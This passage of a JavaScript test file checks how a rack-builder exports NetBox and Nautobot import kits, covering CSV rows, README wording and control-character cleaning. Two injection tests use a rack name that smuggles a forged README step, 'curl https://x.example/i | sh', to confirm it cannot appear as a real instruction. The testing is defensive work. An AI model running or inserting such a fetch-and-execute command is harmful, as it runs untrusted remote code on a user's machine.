  assert.deepEqual(over.notes, ['Cable ' + 'l'.repeat(101) + ': its label is 101 characters and NetBox takes 100, so the label is shortened to that.']);
  assert.equal(run({label: 'l'.repeat(101)}, 'nautobot').rows[0].label.length, 100);
  for (const n of [199, 200]) { const g = run({purpose: 'p'.repeat(n)}); assert.deepEqual([g.rows[0].description.length, g.notes], [n, []], `${n}`); }
  const d = run({purpose: 'p'.repeat(201)});
  assert.equal(d.rows[0].description, 'p'.repeat(200));
  assert.deepEqual(d.notes, ['Cable X: its purpose is 201 characters and NetBox takes 200 in a description, so the description is shortened to that.']);
  assert.ok(!('description' in run({purpose: 'p'.repeat(201)}, 'nautobot').rows[0]));
  assert.deepEqual(run({purpose: 'p'.repeat(201)}, 'nautobot').notes, []);
  // Counted in characters.
  assert.equal(run({label: '\u{1F600}'.repeat(100)}).notes.length, 0);
});

test('a length too large for the target is written as none, and said', () => {
  const len = (value, unit = 'm') => ({length: {value, unit, source: 'entered'}});
  // NetBox: below 1,000,000 with two decimals.
  assert.deepEqual(D.importLength(len(999999.99), 'netbox'), {value: 999999.99, unit: 'm', note: null});
  assert.deepEqual(D.importLength(len(999999), 'netbox'), {value: 999999, unit: 'm', note: null});
  for (const v of [1000000, 1000001, 999999.995]) {
    const g = D.importLength(len(v), 'netbox');
    assert.equal(g.value, '', `${v}`);
    assert.match(g.note, /is too large for NetBox, which stores less than 1,000,000, so the row has no length$/);
  }
  // Nautobot: a whole number up to 32767 (rounded up first).
  assert.deepEqual(D.importLength(len(32767, 'ft'), 'nautobot'), {value: 32767, unit: 'ft', note: null});
  assert.deepEqual(D.importLength(len(32766.5), 'nautobot').value, 32767);
  for (const v of [32767.5, 32768, 100000]) {
    const g = D.importLength(len(v), 'nautobot');
    assert.deepEqual([g.value, g.unit], ['', ''], `${v}`);
    assert.match(g.note, /is too large for Nautobot, which stores whole numbers up to 32,767, so the row has no length$/);
  }
  assert.equal(D.importLength(len(32768), 'netbox').value, 32768);   // NetBox takes it
  // In a row: the cable is written, with no length and no unit.
  const cables = [{id: 'c9', a: end('i2', 'port-1'), b: end('i4', 'port-2-1'), media: 'cat6', purpose: '', label: 'X', route: [], ...len(40000)}];
  const got = D.cableImportRows({rack: {...RACK, cables}, target: 'nautobot', names: NAMES, kept: ALL, resolve, ends: landed(cables)});
  assert.deepEqual([got.rows[0].length, got.rows[0].length_unit], ['', '']);
  assert.deepEqual(got.notes, ['Cable X: its length (40000 m) is too large for Nautobot, which stores whole numbers up to 32,767, so the row has no length.']);
});

test('a cable whose two ends are the same component has no row, and is said', () => {
  const cables = [{id: 'c9', a: end('i2', 'port-1'), b: end('i2', 'port-1'), media: 'cat6', purpose: '', label: 'X', route: []}];
  for (const target of ['netbox', 'nautobot']) {
    const got = D.cableImportRows({rack: {...RACK, cables}, target, names: NAMES, kept: ALL, resolve, ends: landed(cables)});
    assert.deepEqual(got.rows, []);
    assert.deepEqual(got.left, ['Cable X is not in the cables file: its two ends are the same port, port-1 on leaf-1.']);
  }
});

test('a comma in a PORT name leaves a NetBox cable out; Nautobot\'s script takes the name whole', () => {
  const cables = [{id: 'c9', a: end('i2', 'port-1'), b: end('i4', 'port-2-1'), media: 'cat6', purpose: '', label: 'X', route: []}];
  const comma = e => (e.item === 'i2' ? {ok: true, name: 'port 1, front', type: 'dcim.interface'} : resolve(e));
  const run = target => D.cableImportRows({rack: {...RACK, cables}, target, names: NAMES, kept: ALL, resolve: comma, ends: landed(cables)});
  assert.deepEqual(run('netbox').left, ['Cable X is not in the cables file: end A: NetBox reads a comma in a device or port name as a list, so "port 1, front" cannot be written.']);
  assert.deepEqual(run('netbox').rows, []);
  assert.equal(run('nautobot').rows[0].a_name, 'port 1, front');
});

test('a part of a device with no type is said in words that make sense', () => {
  const type = {manufacturer: 'M', model: 'CARD', lists: D.typeLists('model: CARD\n')};
  const got = D.moduleImportRows({target: 'netbox', parts: [{itemId: 'i1', path: 'slot-1/module', ref: 'c'}], names: NAMES, kept: ALL,
    deviceOf: () => null, moduleOf: () => type});
  assert.deepEqual(got.left, ['core-1 slot-1: CARD is not in the modules file. core-1 has no device type, so it has no module bays.']);
});

// ── README.txt ──────────────────────────────────────────────────────────
const DAY = new Date(2026, 9, 4);
const README_RACK = {name: 'Cable test', frame: FRAME};

const WHOLE = {width: 1e9};          // a paragraph on one line, for reading its words

test("the NetBox kit's README: what must exist, each file in import order with its row count, then what is not carried", () => {
  const got = D.kitReadme({target: 'netbox', rack: README_RACK, date: DAY, dcim: {site: 'Lab 1', role: 'Router'}, typeFiles: 7,
    manufacturers: ['BATM/Telco Systems', 'Cisco', 'Edgecore'], rows: {rack: 1, devices: 3, modules: 1, cables: 1},
    left: ['demarc-i3 is not in the devices file: because.', 'Cable c2 is not in the cables file: why.'], notes: ['A best guess.'], ...WHOLE});
  assert.equal(got.text, [
    'NetBox import kit for Cable test, from the Portrayal Rack Builder, 2026-10-04.',
    '',
    'Before you import, NetBox must already have:',
    '- the site "Lab 1"',
    '- the device role "Router"',
    '- these manufacturers: BATM/Telco Systems, Cisco, Edgecore',
    '',
    'Import in this order. NetBox takes each CSV file whole or not at all: one refused row refuses the file.',
    'Step 1: types/device-types/, then types/module-types/ (7 files): Device Types > Import and Module Types > Import, format YAML, one file at a time. The module types must be in before step 4.',
    'Step 2: 1-rack.csv (1 row): Racks > Import. Creates the rack "Cable test", 24U, numbered from the bottom.',
    'Step 3: 2-devices.csv (3 rows): Devices > Import. Every device is planned.',
    "Step 4: 3-modules.csv (1 row): Modules > Import. This creates each card's ports, so it comes before the cables.",
    'Step 5: 4-cables.csv (1 row): Cables > Import.',
    '',
    'If NetBox is not empty:',
    '- If the rack "Cable test" is already in that site, skip step 2 and check that it is 24U, numbered from the bottom. Step 3 puts the devices in it.',
    '- Steps 4 and 5 find a device by its name in every site, and step 4 finds a module type by its model in every manufacturer: a name NetBox already has twice is refused as not unique.',
    '',
    'Not in this kit:',
    '- demarc-i3 is not in the devices file: because.',
    '- Cable c2 is not in the cables file: why.',
    '',
    'Notes:',
    '- A best guess.',
    ''].join('\n'));
  // What the status line counts: the lines the file carries beyond its instructions.
  assert.deepEqual(got.notes, ['demarc-i3 is not in the devices file: because.', 'Cable c2 is not in the cables file: why.', 'A best guess.']);
});

test('a README is wrapped at 78 columns with a hanging indent, in sentence case, in LF', () => {
  const long = 'Cable c2 is not in the cables file: ' + 'a long reason that goes on and on '.repeat(8) + 'end.';
  for (const target of ['netbox', 'nautobot']) {
    const got = D.kitReadme({target, rack: README_RACK, date: DAY, dcim: {}, typeFiles: 7, manufacturers: ['Cisco'],
      rows: {rack: 1, devices: 3, modules: 1, cables: 1}, left: [long], notes: ['n '.repeat(60).trim()]});
    assert.ok(!got.text.includes('\r'));
    // A command or a path may run over; prose never does.
    for (const line of got.text.split('\n').filter(l => !l.startsWith('        export ') && !l.startsWith('        python3 ')))
      assert.ok(line.length <= 78, `${line.length}: ${line}`);
    const at = got.text.split('\n').findIndex(l => l.startsWith('- Cable c2 is not in the cables file: a long'));
    assert.ok(at > 0 && /^  \S/.test(got.text.split('\n')[at + 1]), 'a list item continues on a hanging indent');
    assert.ok(!/[A-Z]{4,} [A-Z]{2,}/.test(got.text), 'no heading or warning is in capitals');
    assert.ok(got.text.startsWith(`${target === 'nautobot' ? 'Nautobot' : 'NetBox'} import kit`));
    assert.ok(got.text.split('\n').slice(1, 4).some(l => l.startsWith('Read this first: ')), 'the warning comes first');
    // Nothing mixes step numbers with file numbers: a step is "Step N:", and a file keeps its own number.
    assert.ok(!/^\d\. /m.test(got.text));
    assert.match(got.text, /^Step 1: /m);
  }
});

test('blank settings: the first lines say the devices file will be refused, and name the columns', () => {
  const nb = D.kitReadme({target: 'netbox', rack: README_RACK, date: DAY, dcim: {}, typeFiles: 1, rows: {rack: 1, devices: 1, modules: 0, cables: 0}, ...WHOLE});
  const warn = "2-devices.csv will be refused as it is: its site and role columns are blank, and NetBox requires both. 1-rack.csv's site " +
    'column is blank too. Set the site and the device role under Export, DCIM import settings, and export again; or fill those columns in by hand.';
  assert.deepEqual(nb.text.split('\n').slice(0, 4), ['NetBox import kit for Cable test, from the Portrayal Rack Builder, 2026-10-04.', '', `Read this first: ${warn}`, '']);
  assert.deepEqual(nb.notes, [warn]);
  assert.ok(nb.text.includes('- a site (none is set in this kit)\n- a device role (none is set in this kit)\n'));
  // A file with no rows is still in the kit, and the README says it is empty.
  assert.ok(nb.text.includes('Step 4: 3-modules.csv (no rows: it holds its header only, so skip it): Modules > Import.'));
  assert.ok(nb.text.includes('Step 5: 4-cables.csv (no rows: it holds its header only, so skip it): Cables > Import.'));
  assert.ok(nb.text.includes('Not in this kit:\n- Nothing: every device, card and cable in this rack is in the files.\n'));
  assert.ok(!nb.text.includes('Notes:'));
  // One blank column: only that one is named.
  assert.equal(D.kitReadme({target: 'netbox', rack: README_RACK, date: DAY, dcim: {site: 'Lab 1'}, rows: {}, ...WHOLE}).text.split('\n')[2],
    'Read this first: 2-devices.csv will be refused as it is: its role column is blank, and NetBox requires it. Set the device role under Export, ' +
    'DCIM import settings, and export again; or fill that column in by hand.');
  const nt = D.kitReadme({target: 'nautobot', rack: README_RACK, date: DAY, dcim: {role: 'R'}, rows: {}, ...WHOLE});
  assert.equal(nt.text.split('\n')[2],
    'Read this first: 1-devices.csv will be refused as it is: its location__name column is blank, and Nautobot requires it. Set the location under Export, ' +
    'DCIM import settings, and export again; or fill that column in by hand.');
});

test("the Nautobot kit's README: the rack and the Planned status must exist, the types step is plain, the cables go through the script", () => {
  const down = {...README_RACK, frame: {...FRAME, numbering: 'top-down'}};
  const got = D.kitReadme({target: 'nautobot', rack: down, date: DAY, dcim: {site: 'Lab 1', role: 'R'}, typeFiles: 2,
    manufacturers: ['Cisco'], rows: {devices: 4, modules: 1, cables: 2}, ...WHOLE});
  for (const line of [
    'Nautobot import kit for Cable test, from the Portrayal Rack Builder, 2026-10-04.',
    '- the location "Lab 1", of a location type that allows devices and racks',
    '- the role "R", for devices',
    '- a status named Planned, for devices, modules and cables',
    '- these manufacturers: Cisco',
    '- the rack "Cable test" in that location: 24U, numbered from the top (descending units). This kit has no rack file for Nautobot.',
    'If Nautobot is not empty:',
    '- If a rack named "Cable test" is in another location too, that one is not used: 1-devices.csv finds the rack by its name and its location together (rack__name, rack__location__name), so the rack must be the one in the location "Lab 1".',
    '- Step 3 and import_cables.py find a device by its name in every location: a device name Nautobot already has twice is refused, and the script says so for each row that names it.',
    "Step 1: types/device-types/, then types/module-types/ (2 files): Device Types > Import and Module Types > Import, one YAML file per import.",
    'Step 2: 1-devices.csv (4 rows): Devices > Import, or POST it to /api/dcim/devices/ as text/csv. Every device is planned.',
    "Step 3: 2-modules.csv (1 row): Modules > Import, or POST it to /api/dcim/modules/ as text/csv. This creates each card's ports, so it comes before the cables.",
    "Step 4: 3-cables.csv (2 rows), with import_cables.py. Warning: do not give 3-cables.csv to Nautobot's own importer. Nautobot takes a cable's ends by id only, and from a file that names them it creates cables with no ends.",
    '        export NAUTOBOT_TOKEN=...     (an API token; the script never prints it)',
    '        python3 import_cables.py 3-cables.csv             (a dry run: what it would create, and what it cannot find)',
    '        python3 import_cables.py 3-cables.csv --apply     (creates the cables)',
    "        A cable's purpose is not carried into Nautobot by this kit."])
    assert.ok(got.text.split('\n').includes(line), line);
  assert.ok(!got.text.includes('has no description'), 'the facts file does not say a Nautobot cable has no description');
  assert.ok(!/verified/i.test(got.text), 'the types step was imported through Nautobot 3.2.6 on 2026-10-04: the README no longer calls it unverified');
  assert.deepEqual(got.notes, []);
  assert.ok(!got.text.includes('1-rack.csv'));
  // The script could not be fetched: the kit comes without it, and says where it is.
  const bare = D.kitReadme({target: 'nautobot', rack: README_RACK, date: DAY, dcim: {site: 'L', role: 'R'}, rows: {}, script: false, ...WHOLE});
  const gone = 'import_cables.py could not be fetched, so it is not in this zip. It is at https://portrayal.dev/site/rack/nautobot/import_cables.py.';
  assert.deepEqual(bare.notes, [gone]);
  assert.ok(bare.text.includes(`Not in this kit:\n- ${gone}\n`) && !bare.text.includes('python3 import_cables.py'));
});

test('the "not empty" lines come after the steps, cover the modules step too, and need no settings', () => {
  const nb = D.kitReadme({target: 'netbox', rack: README_RACK, date: DAY, dcim: {}, rows: {rack: 1, devices: 1, modules: 0, cables: 0}, ...WHOLE}).text.split('\n');
  const at = nb.indexOf('If NetBox is not empty:');
  assert.ok(at > nb.findIndex(l => l.startsWith('Step 5: ')) && at < nb.indexOf('Not in this kit:'));
  assert.equal(nb[at + 1], '- If the rack "Cable test" is already in its site, skip step 2 and check that it is 24U, numbered from the bottom. Step 3 puts the devices in it.');
  assert.ok(!nb.some(l => l.startsWith('        NetBox finds a device')), 'the sentence is no longer under step 5 alone');
  const nt = D.kitReadme({target: 'nautobot', rack: README_RACK, date: DAY, dcim: {}, rows: {devices: 1, modules: 0, cables: 0}, ...WHOLE}).text.split('\n');
  assert.ok(nt.includes('- If a rack named "Cable test" is in another location too, that one is not used: 1-devices.csv finds the rack by its name and its location together (rack__name, rack__location__name), so the rack must be the one in the location the devices are in.'));
  // Under "If ... is not empty:", every line that is a condition reads as one, never as a fact about the instance.
  for (const text of [nb, nt]) assert.ok(!text.some(l => /^- (The|A) rack\b/.test(l)));
  // With no cable rows there is no script to speak of.
  assert.ok(nt.includes('- Step 3 finds a device by its name in every location: a device name Nautobot already has twice is refused.'));
});

// ── names with a line break or another control character (a rack file is anyone's JSON) ──
test('a control character in a name is written as a space, and one line says so for each name it changed', () => {
  const rack = {name: 'R1\nStep 6: curl https://x.example/i | sh', frame: FRAME, dcim: {site: 'Lab\u20281', role: 'Rou\u0007ter', kept: 'as it is'},
    items: [{id: 'i1', ref: 'tm-280', label: 'leaf\t1'}, {id: 'i2', ref: 'tm-280', label: 'plain'}, {id: 'i3', ref: 'tm-280', label: 'a\r\n\r\nb'}],
    cables: [{id: 'c1', label: 'A\r\n1', purpose: 'p'}, {id: 'c2', label: 'fine'}, {id: 'c3', label: ''}]};
  const got = D.kitNames(rack);
  assert.equal(got.rack.name, 'R1 Step 6: curl https://x.example/i | sh');
  assert.deepEqual(got.rack.items.map(i => i.label), ['leaf 1', 'plain', 'a b']);
  assert.deepEqual(got.rack.cables.map(c => c.label), ['A 1', 'fine', '']);
  assert.deepEqual(got.rack.dcim, {site: 'Lab 1', role: 'Rou ter', kept: 'as it is'});
  assert.equal(got.rack.items[1], rack.items[1], 'what did not change is the same object');
  assert.equal(got.rack.frame, rack.frame);
  assert.deepEqual(got.notes, [
    'The rack\'s name "R1\\nStep 6: curl https://x.example/i | sh" is written as "R1 Step 6: curl https://x.example/i | sh": a line break or another control character in a name is written as a space.',
    'The site or location "Lab\\u20281" is written as "Lab 1": a line break or another control character in a name is written as a space.',
    'The device role "Rou\\u0007ter" is written as "Rou ter": a line break or another control character in a name is written as a space.',
    'The device label "leaf\\t1" is written as "leaf 1": a line break or another control character in a name is written as a space.',
    'The device label "a\\r\\n\\r\\nb" is written as "a b": a line break or another control character in a name is written as a space.',
    'The cable label "A\\r\\n1" is written as "A 1": a line break or another control character in a name is written as a space.']);
  assert.ok(got.notes.every(n => !/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/.test(n)), 'the original is shown escaped');
  // Nothing to change: the same rack, and nothing said.
  const clean = {name: 'R1', frame: FRAME, items: [{id: 'i1', ref: 'x', label: 'leaf 1'}], cables: [{id: 'c1', label: 'A'}]};
  assert.deepEqual([D.kitNames(clean).rack === clean, D.kitNames(clean).notes], [true, []]);
  assert.ok(!('dcim' in D.kitNames({...rack, dcim: undefined}).rack) || D.kitNames({...rack, dcim: undefined}).rack.dcim === undefined);
  // Every C0 and C1 control, DEL and the two Unicode line breaks; a run of them is one space.
  for (const c of ['\u0000', '\u0009', '\u000a', '\u000b', '\u000c', '\u000d', '\u001b', '\u001f', '\u007f', '\u0085', '\u009f', '\u2028', '\u2029'])
    assert.equal(D.flat(`a${c}${c}b`), 'a b', `U+${c.charCodeAt(0).toString(16)}`);
  assert.equal(D.flat('a b\u00e9 \u{1F600}'), 'a b\u00e9 \u{1F600}');
});

test('a device name is clean whatever its label and its id hold, in every file and in the cable schedule', () => {
  // A hand-edited file: two devices with one label, and ids with a line break in them. The id is what tells twins apart.
  const items = [{id: 'i\n1', ref: 'tm-280', cfg: 'base', label: 'twin', ru: 2, u: 1, face: 'front', turned: false},
                 {id: 'i\r\n\t2', ref: 'tm-280', cfg: 'base', label: 'twin', ru: 4, u: 1, face: 'front', turned: false},
                 {id: 'i3', ref: 'tm-280', cfg: 'base', label: 'lone\u0007one', ru: 6, u: 1, face: 'front', turned: false},
                 {id: 'i\u20284', ref: 'tm-280', cfg: 'base', label: '\n\t', ru: 8, u: 1, face: 'front', turned: false},
                 {id: 'i5', ref: 'tm\n280', cfg: 'base', label: '', ru: 10, u: 1, face: 'front', turned: false}];
  const names = X.uniqueNames(items);
  assert.deepEqual([...names.values()].map(v => v.name), ['twin-i 1', 'twin-i 2', 'lone one', 'i 4', 'tm 280']);
  assert.deepEqual([...names.keys()], items.map(i => i.id), 'the map is still keyed by the id as written');
  assert.ok([...names.values()].every(v => v.name && !/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/.test(v.name)));
  // A label of control characters alone is not an empty name, and not a twin of another such label by accident.
  assert.deepEqual([...X.uniqueNames([{id: 'a', ref: 'r', label: '\n'}, {id: 'b', ref: 'r', label: '\t\t'}]).values()].map(v => v.name), ['a', 'b']);
  // Two labels that are one name once cleaned are twins.
  assert.deepEqual([...X.uniqueNames([{id: 'a', ref: 'r', label: 'x\ny'}, {id: 'b', ref: 'r', label: 'x y'}]).values()].map(v => v.name), ['x y-a', 'x y-b']);
  // Ordinary labels and ids: exactly as before.
  assert.deepEqual([...X.uniqueNames(ITEMS).values()].map(v => v.name), ['core-1', 'leaf-1', 'demarc-i3', 'demarc-i4']);
  assert.deepEqual([...X.uniqueNames([{id: 'i1', ref: 'r', label: ' Leaf '}, {id: 'i2', ref: 'r', label: 'leaf'}, {id: 'i3', ref: 'r', label: ''},
                                      {id: 'i4', ref: 'r', label: 'tab\u00a0 two  spaces'}]).values()].map(v => v.name),
    ['Leaf-i1', 'leaf-i2', 'r', 'tab\u00a0 two  spaces']);
  // Through the kit's own cleaning (kitNames leaves ids alone) and into the cells: name, comments, modules, cables.
  const rack = D.kitNames({name: 'R', frame: FRAME, items, cables: [
    {id: 'c1', a: end('i\n1', 'port-1-1'), b: end('i\r\n\t2', 'port-2-1'), media: 'cat6', purpose: '', label: 'L', route: []}]}).rack;
  const types = new Map(rack.items.map(i => [i.id, {manufacturer: 'BATM/Telco Systems', model: 'TM-280', isFullDepth: false, guess: false}]));
  const csv = (columns, rows) => X.toCsv(columns, rows);
  const oneLineEach = (text, n) => assert.equal(text.trimEnd().split(/\r\n|[\n\u000b\u000c\r\u0085\u2028\u2029]/).length, n + 1, text);
  for (const target of ['netbox', 'nautobot']) {
    const dev = X.deviceImportRows({rack, items: rack.items, types, target, dcim: {site: 'S', role: 'R'}});
    assert.deepEqual(dev.rows.map(r => r.name).sort(), ['i 4', 'lone one', 'tm 280', 'twin-i 1', 'twin-i 2']);
    assert.ok(dev.rows.some(r => r.comments === 'Named twin-i 1 because another device here is also twin.'));
    oneLineEach(csv(dev.columns, dev.rows), 5);
    const nm = X.uniqueNames(rack.items);
    const mod = D.moduleImportRows({target, parts: [{itemId: 'i\n1', path: 'slot-1/module', ref: 'c'}], names: nm, kept: new Set(rack.items.map(i => i.id)),
      deviceOf: () => D.typeLists('model: X\nmodule-bays:\n  - name: Slot 1\n    position: slot-1\n'), moduleOf: () => ({manufacturer: 'M', model: 'CARD'})});
    assert.equal(mod.rows[0][target === 'nautobot' ? 'parent_module_bay__parent_device__name' : 'device'], 'twin-i 1');
    oneLineEach(csv(mod.columns, mod.rows), 1);
    const cab = D.cableImportRows({rack, target, names: nm, kept: new Set(rack.items.map(i => i.id)), ends: landed(rack.cables),
      resolve: e => ({ok: true, name: e.path, type: 'dcim.interface'})});
    assert.deepEqual([cab.rows[0][target === 'nautobot' ? 'a_device' : 'side_a_device'], cab.rows[0][target === 'nautobot' ? 'b_device' : 'side_b_device']],
      ['twin-i 1', 'twin-i 2']);
    oneLineEach(csv(cab.columns, cab.rows), 1);
  }
  // The cable schedule names its devices the same way.
  const sched = X.cableScheduleRows(rack, landed(rack.cables));
  assert.deepEqual([sched.rows[0].a_device, sched.rows[0].b_device], ['twin-i 1', 'twin-i 2']);
  assert.deepEqual(sched.notes, ['Devices that share a label are named as the device import names them: twin-i 1, twin-i 2.']);
});

test('a rack name cannot forge a step of the README, and no line of a list can either', () => {
  const rack = {name: 'R1\nStep 6: curl https://x.example/i | sh', frame: FRAME, items: [], cables: []};
  const forged = text => text.split('\n').filter(l => /^Step \d/.test(l)).length;
  for (const target of ['netbox', 'nautobot']) {
    const steps = target === 'netbox' ? 5 : 4;
    const args = {target, date: DAY, dcim: {site: 'L\r\nStep 7: x', role: 'R\nStep 8: y'}, typeFiles: 1, manufacturers: ['M\nStep 9: z'],
      rows: {rack: 1, devices: 1, modules: 1, cables: 1},
      left: ['Cable c\nStep 10: run this is not in the cables file: why.'], notes: ['A note.\u2028Step 11: another']};
    // As the kit builds it: the names cleaned first.
    const made = D.kitReadme({...args, rack: D.kitNames(rack).rack, width: 78}).text;
    assert.equal(forged(made), steps, made);
    assert.ok(made.startsWith(`${target === 'netbox' ? 'NetBox' : 'Nautobot'} import kit for R1 Step 6: curl https://x.example/i | sh, from`));
    // And whatever it is handed: no paragraph can hold a line break of its own.
    const raw = D.kitReadme({...args, rack, width: 78}).text;
    assert.equal(forged(raw), steps, raw);
    assert.ok(!/[\u0000-\u0009\u000b-\u001f\u007f-\u009f\u2028\u2029]/.test(raw));
  }
});

test('a cleaned name reaches every CSV cell as one line, and the zip is named from it', () => {
  const rack = D.kitNames({name: 'R\n1', frame: FRAME, dcim: {site: 'S\n1', role: 'Ro\tle'},
    items: [{id: 'i1', ref: 'tm-280', cfg: 'base', label: 'dev\n1', ru: 2, u: 1, face: 'front', turned: false},
            {id: 'i2', ref: 'tm-280', cfg: 'base', label: 'dev 1', ru: 4, u: 1, face: 'front', turned: false}],
    cables: [{id: 'c\n9', a: end('i1', 'port-1-1'), b: end('i2', 'port-2-1'), media: 'cat6', purpose: '', label: '', route: []},
             {id: 'c2', a: end('i1', 'port-2-1'), b: end('i2', 'port-1-1'), media: 'cat6', purpose: '', label: 'L\r\n2', route: []}]}).rack;
  const types = new Map(rack.items.map(i => [i.id, {manufacturer: 'BATM/Telco Systems', model: 'TM-280', isFullDepth: false, guess: false}]));
  const oneLine = (columns, rows) => assert.equal(X.toCsv(columns, rows).trimEnd().split(/\r\n|[\n\u000b\u000c\r\u0085\u2028\u2029]/).length, rows.length + 1);
  for (const target of ['netbox', 'nautobot']) {
    const dev = X.deviceImportRows({rack, items: rack.items, types, target, dcim: M.dcimOf(rack)});
    // Two labels that are one name once cleaned are told apart like any other twins.
    assert.deepEqual(dev.rows.map(r => r.name).sort(), ['dev 1-i1', 'dev 1-i2']);
    oneLine(dev.columns, dev.rows);
    const names = X.uniqueNames(rack.items);
    const cab = D.cableImportRows({rack, target, names, kept: new Set(['i1', 'i2']), ends: landed(rack.cables),
      resolve: e => ({ok: true, name: e.path.split(':').pop(), type: 'dcim.interface'})});
    // A cable with no label is its id, cleaned the same way.
    assert.deepEqual(cab.rows.map(r => r.label), ['c 9', 'L 2']);
    oneLine(cab.columns, cab.rows);
  }
  const r = X.rackImportRows({rack, dcim: M.dcimOf(rack)});
  assert.deepEqual([r.rows[0].name, r.rows[0].site], ['R 1', 'S 1']);
  assert.equal(X.fileStem(rack.name), 'R-1');
});

test('a Nautobot kit with no cable rows shows no script commands and no warning about the file', () => {
  const got = D.kitReadme({target: 'nautobot', rack: README_RACK, date: DAY, dcim: {site: 'L', role: 'R'}, rows: {devices: 1, modules: 0, cables: 0}, ...WHOLE});
  assert.ok(got.text.includes('Step 4: 3-cables.csv (no rows: it holds its header only, so skip it).\n'));
  for (const gone of ['python3 import_cables.py', 'NAUTOBOT_TOKEN', 'Warning: do not give', "purpose is not carried"])
    assert.ok(!got.text.includes(gone), gone);
});

test("the README says where the script is on the page's own site, or on portrayal.dev when there is none", () => {
  const args = {target: 'nautobot', rack: README_RACK, date: DAY, dcim: {site: 'L', role: 'R'}, rows: {}, script: false, ...WHOLE};
  const gone = url => `import_cables.py could not be fetched, so it is not in this zip. It is at ${url}.`;
  assert.deepEqual(D.kitReadme({...args, scriptUrl: 'http://127.0.0.1:8932/site/rack/nautobot/import_cables.py'}).notes,
    [gone('http://127.0.0.1:8932/site/rack/nautobot/import_cables.py')]);
  assert.deepEqual(D.kitReadme(args).notes, [gone('https://portrayal.dev/site/rack/nautobot/import_cables.py')]);
});

test("a device's own line says why its type is missing when a file or the index could not be read", () => {
  const item = {id: 'i1', ref: 'tm-280', cfg: 'base', label: 'demarc', ru: 2, u: 1, face: 'front', turned: false};
  const why = new Map([['i1', 'its NetBox device type file, netbox/x.yaml, could not be read']]);
  assert.equal(X.deviceImportRows({rack: RACK, items: [item], types: new Map([['i1', null]]), why}).left[0].reason,
    'demarc is not in the devices file: its NetBox device type file, netbox/x.yaml, could not be read. Add the type and the device by hand.');
  assert.match(X.deviceImportRows({rack: RACK, items: [item], types: new Map([['i1', null]])}).left[0].reason, /there is no NetBox device type for tm-280 \(base\)\./);
});

test('the files of a kit are numbered in import order', () => {
  assert.deepEqual(D.KIT_FILES, {
    netbox: {rack: '1-rack.csv', devices: '2-devices.csv', modules: '3-modules.csv', cables: '4-cables.csv'},
    nautobot: {devices: '1-devices.csv', modules: '2-modules.csv', cables: '3-cables.csv'}});
  assert.equal(D.KIT_SCRIPT, 'import_cables.py');
});

test('a routed length is said to be measured along its route', () => {
  const c = {...CABLES[0], length: {value: 2, unit: 'm', source: 'routed', measured: 1.62}};
  const nb = D.cableImportRows({rack: {...RACK, cables: [c]}, target: 'netbox', names: NAMES, kept: ALL, resolve, ends: ENDS});
  assert.equal(nb.rows[0].description, 'uplink. Length measured along its route.');
  const nt = D.cableImportRows({rack: {...RACK, cables: [c]}, target: 'nautobot', names: NAMES, kept: ALL, resolve, ends: ENDS});
  assert.deepEqual(nt.notes, ['Cable A1: length measured along its route.']);
  assert.equal(cableRows().rows[0].description, 'uplink');
});
